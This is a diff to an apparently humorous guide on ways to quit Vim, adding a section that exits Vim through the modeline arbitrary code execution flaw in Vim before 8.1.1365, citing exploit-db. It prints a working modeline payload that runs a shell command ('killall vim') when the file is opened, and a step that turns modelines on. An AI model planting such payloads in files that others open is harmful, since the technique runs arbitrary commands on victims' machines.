@@ -647,6 +647,23 @@ vim
 ```
 5. In the AWS EC2, select the newly created EC2 instance and terminate the instance.
 
+## The Arbitrary Code Execution Way
+
+Based on https://www.exploit-db.com/exploits/46973. Works with Vim < 8.1.1365.
+
+1. Create a file (say `quit.txt`) with the following data:
+```
+echo ':!killall vim||" vi:fen:fdm=expr:fde=assert_fails("source\!\ \%"):fdl=0:fdt="' > quit.txt
+```
+2. Ensure that the modeline option has not been disabled.
+```
+echo "set modeline" >> .vimrc
+```
+3. Open `quit.txt`.
+```
+:e! quit.txt
+```
+
 ## The Circuit Breaker Way
 Credit:@Tomcat-42
 
